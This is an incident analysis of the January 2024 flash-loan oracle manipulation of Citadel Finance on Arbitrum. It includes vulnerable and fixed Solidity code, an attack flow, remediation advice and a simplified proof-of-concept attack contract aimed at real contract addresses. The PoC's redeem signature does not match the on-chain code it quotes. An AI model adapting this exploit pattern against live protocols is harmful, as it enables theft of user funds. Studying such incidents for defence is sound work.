# Citadel Finance — Flash Loan-Based Price Oracle Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-01-16 |
| **Protocol** | Citadel Finance |
| **Chain** | Arbitrum |
| **Loss** | ~$93,000 |
| **Attacker** | [0xfcf88e5e](https://arbiscan.io/address/0xfcf88e5e1314ca3b6be7eed851568834233f8b49) |
| **Attack Contract** | [0xfcbf4112](https://arbiscan.io/address/0xfcbf411237ac830dc892edec054f15ba7f9ea5a6) |
| **Vulnerable Contract** | [Citadel 0x34b66699](https://arbiscan.io/address/0x34b666992fcce34669940ab6b017fe11e5750799) |
| **Root Cause** | `getCITInUSDAllFixedRates()` directly references the Uniswap V3 `slot0()` spot price, allowing excessive USDC withdrawal at a manipulated CIT price during `redeem()` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/CitadelFinance_exp.sol) |

---

## 1. Vulnerability Overview

Citadel Finance's `redeem()` function uses `getCITInUSDAllFixedRates()` to calculate the CIT price at redemption time. Because this function relies on the spot price of the Uniswap V3 WETH/USDC pool, it is manipulable via flash loan. The attacker flash-borrowed 4,500 WETH to manipulate the pool price, then called `redeem()` to withdraw far more than the amount originally deposited.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: redemption calculation based on spot price
function redeem(uint256 amount) external returns (uint256) {
    uint256 citPrice = getCITInUSDAllFixedRates(); // spot price — manipulable
    uint256 redeemAmount = amount * citPrice / 1e18;
    require(redeemAmount <= maxRedeemable, "exceeds limit");
    _burn(msg.sender, amount);
    USDC.transfer(msg.sender, redeemAmount);
}

// getCITInUSDAllFixedRates() internally uses Uniswap V3 slot0()
// → sqrtPriceX96 can be manipulated via flash loan

// ✅ Safe code: redemption calculation based on TWAP
function redeem(uint256 amount) external returns (uint256) {
    uint256 citPrice = getCITTWAPPrice(1800); // 30-minute TWAP
    uint256 redeemAmount = amount * citPrice / 1e18;
    require(redeemAmount <= maxRedeemable, "exceeds limit");
    _burn(msg.sender, amount);
    USDC.transfer(msg.sender, redeemAmount);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: CitadelRedeem.sol
    function redeem(uint256 underlying, uint256 token, uint256 amount, uint8 rate) public nonReentrant {
        require(underlying == 0 || underlying == 1, "Invalid underlying");
        require(token == 0 || token == 1, "Invalid token");
        require(rate == 0 || rate == 1, "Invalid rate");
        require(amount > 0, "Amount must be greater than 0");

        uint256 amountAvailable = CITStaking.redeemCalculator(msg.sender)[token][rate];
        require(amountAvailable > 0, "Nothing to redeem");

        uint256 amountInUnderlying;
        address tokenAddy = underlying == 0 ? address(USDC) : address(WETH);
        // Variable rate
        if (rate == 0) {
            require(amount <= amountAvailable, "Not enough CIT or bCIT to redeem");
            require(amount <= maxRedeemableVariable, "Amount too high");
            maxRedeemableVariable -= amount;
            address[] memory path = new address[](3);

            path[0] = address(CIT); // 1e18
            path[1] = address(WETH);
            path[2] = address(USDC); // 1e6

            uint[] memory a = camelotRouter.getAmountsOut(amount, path);

            if (underlying == 0) {
                amountInUnderlying = a[2]; // result in 6 decimal
            } else {
                amountInUnderlying = a[1]; // result in 18 decimal
            }
        } 
        // Fixed rate
        else {
            uint256 _amount = CITStaking.getCITInUSDAllFixedRates(msg.sender, amount);  // ❌ vulnerability
            require(amount <= amountAvailable, "Not enough CIT or bCIT to redeem");
            require(amount <= maxRedeemableFixed, "Amount too high");
            maxRedeemableFixed -= amount;
            if (underlying == 1) {
                address[] memory path = new address[](2);

                path[0] = address(USDC); // 1e6
                path[1] = address(WETH); // 1e18

                uint[] memory a = camelotRouter.getAmountsOut(_amount / 1e12, path); // result in 18 decimal

                amountInUnderlying = a[1];
            } else {
                amountInUnderlying = _amount / 1e12; // 1e6 is the decimals of USDC, so 18 - 12 = 6
            }
        }

        if (token == 0) {
            CIT.burn(CITStakingAddy, amount);
            CITStaking.removeStaking(msg.sender, address(CIT), rate, amount);
        } else if (token == 1) {
            totalbCITRedeemedByUser[msg.sender] += amount;
            bCIT.burn(CITStakingAddy, amount);
            CITStaking.removeStaking(msg.sender, address(bCIT), rate, amount);
        }

        treasury.distributeRedeem(tokenAddy, amountInUnderlying, msg.sender);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Acquire 2,653 CIT → approve → deposit(fixed rate 1)
  │
  ├─→ [2] Uniswap V3 flash: 4,500 WETH flash loan
  │
  ├─→ [3] Swap WETH → USDC in large volume → manipulate WETH/USDC pool price
  │         └─ Artificially inflate CIT spot price
  │
  ├─→ [4] getCITInUSDAllFixedRates() returns manipulated price
  │
  ├─→ [5] Call redeem() → receive excessive USDC at manipulated price
  │
  ├─→ [6] Reverse swap USDC → WETH
  │
  └─→ [7] Repay flash loan and pocket profit (~$93K)
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface ICitadel {
    function redeemCalculator() external view returns (address);
    function getCITInUSDAllFixedRates() external view returns (uint256);
    function deposit(uint256 amount, uint256 fixedRate) external;
    function getTotalTokenStakedForUser(address user) external view returns (uint256);
    function redeem(uint256 amount) external returns (uint256);
}

contract AttackContract {
    ICitadel constant citadel = ICitadel(0x34b666992fcce34669940ab6b017fe11e5750799);
    IERC20 constant CIT  = IERC20(0x43cF1856606df2CB22AEdbA1a3e23725f1594E81);
    IERC20 constant WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 constant USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);

    function testExploit() external {
        // [1] Deposit CIT (fixed rate 1)
        CIT.approve(address(citadel), 2653 ether);
        citadel.deposit(2653 ether, 1);

        // [2] Manipulate pool price via WETH flash loan
        IUniswapV3Pool(0xC6962004f452bE9203591991D15f6b388e09E8D0).flash(
            address(this), 4500 ether, 0, ""
        );
    }

    function uniswapV3FlashCallback(uint256, uint256, bytes calldata) external {
        // [3] Manipulate CIT price by swapping large WETH → USDC
        swapWETHToUSDC(4500 ether);

        // [4] Call redeem at manipulated price
        uint256 stakedAmount = citadel.getTotalTokenStakedForUser(address(this));
        citadel.redeem(stakedAmount);

        // [5] Reverse swap USDC → WETH, then repay flash loan
        swapUSDCToWETH(USDC.balanceOf(address(this)));
        WETH.transfer(msg.sender, 4500 ether + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Flash Loan-Based Oracle Manipulation |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **Attack Vector** | External (via flash loan) |
| **DApp Category** | Staking / Fixed-Rate Protocol |
| **Impact** | Protocol fund theft |

## 6. Remediation Recommendations

1. **Use TWAP Oracle**: Apply a minimum 30-minute TWAP as the price reference instead of the spot price
2. **Deviation Guard**: Block redemptions when the current spot price deviates from TWAP beyond a threshold (e.g., 2%)
3. **Reentrancy Protection**: Prevent reentry from flash loan callbacks via the `nonReentrant` modifier
4. **Price Manipulation Detection**: Temporarily suspend the redemption function when a large price movement occurs within a single block

## 7. Lessons Learned

- Any financial calculation that relies on a spot price (`slot0`) is manipulable via flash loan.
- Value calculations for fixed-rate products must use TWAP or an independent oracle such as Chainlink.
- Flash loan attacks complete within a single transaction and therefore do not affect TWAP, making them difficult to detect after the fact.